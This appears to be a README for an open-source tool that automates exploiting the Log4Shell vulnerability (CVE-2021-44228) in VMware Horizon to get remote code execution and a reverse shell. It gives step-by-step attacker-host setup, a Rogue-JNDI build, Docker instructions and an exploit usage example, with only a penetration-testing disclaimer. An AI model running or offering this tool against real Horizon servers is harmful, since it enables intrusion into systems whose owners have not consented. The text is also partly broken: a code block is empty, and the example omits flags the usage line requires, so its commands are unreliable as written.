# Log4jHorizon
Exploiting CVE-2021-44228 in VMWare Horizon for remote code execution and more.

* BLOG COMING SOON

# Why?

Proof of concepts for this vulnerability are scattered and have to be performed manually. This repository automates the exploitation process. See the blog post above for guidance on post-exploitation.

# Install

This repository can be used manually or with Docker.

### Manual install

To download and run the exploit manually, execute the following steps. First, ensure that Java and Maven are installed on your attacker host. To do this using apt on Debian based operating systems, run the following command:

```
apt update && apt install openjdk-11-jre maven
```

Clone the GitHub repository and install all python requirements:

```
git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jHorizon \
    && cd Log4jHorizon && pip3 install -r requirements.txt
```

From the root of the Log4jHorizon repository, compile the Rogue-Jndi project using the command below:

```
mvn package -f utils/rogue-jndi/
```

### Docker install

First, ensure that Docker is installed on your attacking host. (I am not going to walk you through doing this)

Following that, execute the following command to clone the repository and build the Docker image we will be using.

```
git clone --recurse-submodules https://github.com/puzzlepeaches/Log4jHorizon \
    && cd Log4jHorizon && docker build -t Log4jHorizon .
```

To run the container, run a command similar to the following with your command line flags appended. Note that the container will not catch the reverse shell. You need to create a ncat listener in a separate shell session:

```
```


# Usage

```
usage: exploit.py [-h] -u URL -i CALLBACK -p PORT

arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     VMWare Horizon base URL
```

# Examples

Get a reverse shell using the tool installed on your local system:

```
python3 exploit.py -u https://horizon.acme.com 
```

# Disclaimer
This tool is designed for use during penetration testing; usage of this tool for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. Developers assume no liability and are not responsible for any misuse of this program.

